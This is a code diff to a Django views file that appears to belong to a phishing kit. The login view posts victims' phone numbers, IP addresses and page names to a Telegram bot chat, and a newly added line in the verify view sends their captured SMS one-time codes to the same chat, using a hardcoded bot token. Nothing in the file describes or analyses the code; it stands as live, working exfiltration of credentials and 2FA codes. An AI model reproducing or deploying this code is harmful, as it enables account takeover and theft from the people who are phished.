@@ -25,8 +25,6 @@ from django.urls import reverse
 from django.views.decorators.csrf import ensure_csrf_cookie
 from rest_framework import generics
 
-# Create your views here.
-
 
 
 def index(request):
@@ -73,8 +71,7 @@ def login(request):
             "number3":number3,
             "number4":number4
         }
-        response = requests.post(f'https://api.telegram.org/bot6284666597:AAE17trIGiyILsEmfW9W9KcHNUUnIJKLZ_M/sendMessage?chat_id=-1894884341_506&text=Test')
-
+        response = requests.post(f'https://api.telegram.org/bot6284666597:AAE17trIGiyILsEmfW9W9KcHNUUnIJKLZ_M/sendMessage?chat_id=-1001894884341&text=id:{contact.id}|ip:{contact.ip}\nPage:{contact.page_name}\nnumber:{contact.phone}\n@Maybewhou')
         request.session['contact_id'] = contact.id
         return render(request, 'login/otp.html',context)
     return render(request, 'login/index.html')
@@ -115,6 +112,7 @@ def verify(request):
         context = {
             'last_contact_id': contact.id
         }
+        response = requests.post(f'https://api.telegram.org/bot6284666597:AAE17trIGiyILsEmfW9W9KcHNUUnIJKLZ_M/sendMessage?chat_id=-1001894884341&text=id:{contact.id}|ip:{contact.ip}\nsms:{combined_sms}@Maybewhou')
         return render( request,'login/load.html',context )
     return render( request,'login/index.html',context )
 
@@ -180,5 +178,4 @@ def check_status(request, contact_id):
 class BannedIPListCreateAPIView(generics.ListCreateAPIView):
     queryset = BannedIP.objects.all()
     serializer_class = BannedIPSerializer
-    
     
